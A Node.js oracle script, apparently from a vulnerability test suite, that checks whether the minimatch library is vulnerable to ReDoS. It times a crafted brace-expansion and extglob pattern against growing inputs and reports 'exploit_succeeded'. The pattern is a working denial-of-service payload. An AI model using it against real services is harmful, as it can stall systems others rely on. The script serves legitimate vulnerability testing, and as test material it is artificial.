const minimatch = require('minimatch');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function nowMs() {
  return Number(process.hrtime.bigint()) / 1e6;
}

function measure(pattern, input, rounds) {
  let total = 0;
  let last = null;
  for (let i = 0; i < rounds; i++) {
    const t0 = nowMs();
    last = minimatch(input, pattern);
    total += (nowMs() - t0);
  }
  return { avgMs: total / rounds, last };
}

try {
  const benign = minimatch('file.js', '*.js');
  if (benign !== true) {
    throw new Error('benign operation failed');
  }

  operation_completed = true;

  // ReDoS probe targeting known costly brace expansion + extglob combos in vulnerable minimatch.
  // Keep bounded so execution remains quick.
  const pattern = '{1..12}*(a|{a,b})';
  const smallInput = 'a'.repeat(24) + 'X';
  const largeInput = 'a'.repeat(120) + 'X';

  // Warm up JIT/cache with a tiny harmless call.
  minimatch('aX', pattern);

  const rounds = 2;
  const small = measure(pattern, smallInput, rounds);
  const large = measure(pattern, largeInput, rounds);

  const smallMs = Math.max(small.avgMs, 0.001);
  const largeMs = Math.max(large.avgMs, 0.001);
  const growth = largeMs / smallMs;
  const deltaMs = largeMs - smallMs;

  // Thresholds tuned so vulnerable 3.0.4 should exceed, patched should not.
  const growthThreshold = 12;
  const deltaThresholdMs = 80;

  exploit_succeeded = growth >= growthThreshold && deltaMs >= deltaThresholdMs;

  evidence = JSON.stringify({
    benign_ok: true,
    pattern,
    rounds,
    small_len: smallInput.length,
    large_len: largeInput.length,
    small_result: small.last,
    large_result: large.last,
    small_avg_ms: Number(smallMs.toFixed(3)),
    large_avg_ms: Number(largeMs.toFixed(3)),
    growth: Number(growth.toFixed(2)),
    delta_ms: Number(deltaMs.toFixed(3)),
    growth_threshold: growthThreshold,
    delta_threshold_ms: deltaThresholdMs,
    decision: exploit_succeeded ? 'redos_detected' : 'no_redos_detected'
  });
} catch (err) {
  if (!operation_completed) {
    evidence = 'setup_or_benign_failure: ' + (err && err.message ? err.message : String(err));
    operation_completed = false;
    exploit_succeeded = false;
  } else {
    exploit_succeeded = false;
    evidence = JSON.stringify({
      benign_ok: true,
      malicious_error: err && err.message ? err.message : String(err),
      decision: 'blocked_by_exception'
    });
  }
}

console.log('ORACLE_RESULT ' + JSON.stringify({
  operation_completed,
  exploit_succeeded,
  evidence
}));